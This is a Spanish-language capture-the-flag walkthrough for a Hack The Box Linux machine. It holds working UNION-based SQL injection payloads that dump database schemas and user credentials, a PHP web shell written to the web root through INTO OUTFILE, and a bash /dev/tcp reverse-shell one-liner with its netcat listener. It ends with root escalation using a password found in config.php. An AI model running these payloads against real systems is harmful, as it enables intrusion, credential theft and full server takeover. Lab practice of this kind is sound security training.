## Summary

Tags: #Linux #SQLI #BurpSuite #ReverShell #PHP #Nmap 

- IP -> 10.10.11.116
- Ports -> TCP (22, 80, 8080, 4566), UDP (idk)
- OS ->  Linux 
- Services & Applications
    - 22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
    - 80 -> Apache httpd 2.4.48
    - 8080 -> http nginx / 502 Bad Gateway
    - 4566 -> http nginx / Forbidden

Launchpad -> Focal
## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash
❯ ping -c 1 ❮IP❯                             # Para saber si la maquina esta activa o no (ttl=64 Linux, ttl=128 Windows)

	# IP = IP Address de la maquina target 
	# c = Numero de pings a ejecutar
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p22,80 ❮Target IP❯ -oN targeted
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80
```

```bash
❯ whatweb ❮http://IP:PORT❯             # Nos dara una breve descripcion del gestor de contenidos por un puerto especifico
```

Usaremos **BurpSuite** para interceptar la maquina en la parte del campo de la pagina web.
- Le damos en Send y despues Forward, como miramos que no sale nada lo hacemos en el **proxy** 
- Modificamos al lado de la palabra Brazil en el **Proxy** y le damos Forward
- Intercept off 
- Miramos la respuesta en la web 
- Ahora si podemos seguir modificando en el repeater en la parte de Brazil y le damos Send y Forward y todo lo podremos ver en la web.
- Si no sale recargamos la pagina y deberia de salir el resultado

Inyecciones SQLI
Estamos haciendo que nos comente el esto de la query por ende nos debe de mostrar todo el contenido visible de la pagina.
```bash
❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion 
❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
```

```bash
❯ ' union select 1,2,3 -- -                           # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo
```

Para saber las bases de datos (DB) existentes.
```bash 
❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
```
Encontramos las DBS llamadas 'mysql' y 'registration'

Para saber las tablas de la base de datos (DB) especifica.
```bash
❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -                    # Nos muestra las tablas existentes
Para enumerar las tablas 
```
Encontramos que la tabla tambien de llama 'registration'

Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
```bash 
❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las tablas existentes
```
Nos muestra ahora 4 columnas pero hay dos importantes 'username' y 'userhash'


Para mostrar la data con concatenaciones
```bash
❯ ' union select group_concat(username,':',password) from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
```
Ahora nos disponemos a cargar un archivo y ver si lo podemos observar en la web, esto en una ruta tipica de html que es:
```bash
/var/www/html/file.php 
```

Primero haremos la prueba colocando lo que sea en un archivo .php
```bash
❯ ' union select "❮?php system($_REQUEST['cmd']); ?❯" into outfile "/var/www/html/file.php"-- -   

# Podemos crear un archivo llamado 'file.php' en la ruta html que contenga un cmd que nos interpretara comandos. Primero podemos hacer una prueba, colocando lo que sea en donde esta la parte de System.

# Despues debemos de colocar en la url: \http://1.1.1.1/prueba.php?cmd=whoami
	# 1.1.1.1 -> IP de la victima
	# whoami -> Comando a usar, estos pueden ir variando
	# Pero podemos hacer un archivo de PHP Reverse ...
```
Ahora que hemos agregado un archivo en la ruta del HTML. Podemos probar si tenemos ejecucion remota de comandos. 
Despues de verificar que tenemos ejecucion remota de comandos, hacemos lo siguiente. 

## User

Comando de ReverShell para colocarlo en la url
```bash
❯ bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'  # Comando que debemos de Encodear en forma de URL y esto lo podemos colocar en BurpSuite, para despues hacerle Encoder y poderlo poner en la URL 
```
Despues debemos de colocar en la url: **\http://1.1.1.1/prueba.php?cmd=** Aqui

Despues nos colocamos en escucha para al momento de darle Enter a la URL, podamos recibir la Revershell
```bash
❯ nc -nlvp 443 
```

Una vez adentro haciendo un ls -l podemos ver un file que se llama config.php en el cual cuando lo miremos con cat encontraremos un user y passwd.
Si nos regresamos al home del usuario podremos encontrar la flag user.txt

## Root
Despues con el siguiente comando y la passwd que habiamos encontrado, podremos convertirnos en Root
```bash
❯ su root                        # Para convertirnos en root y debemos de proporcionar una passwd
```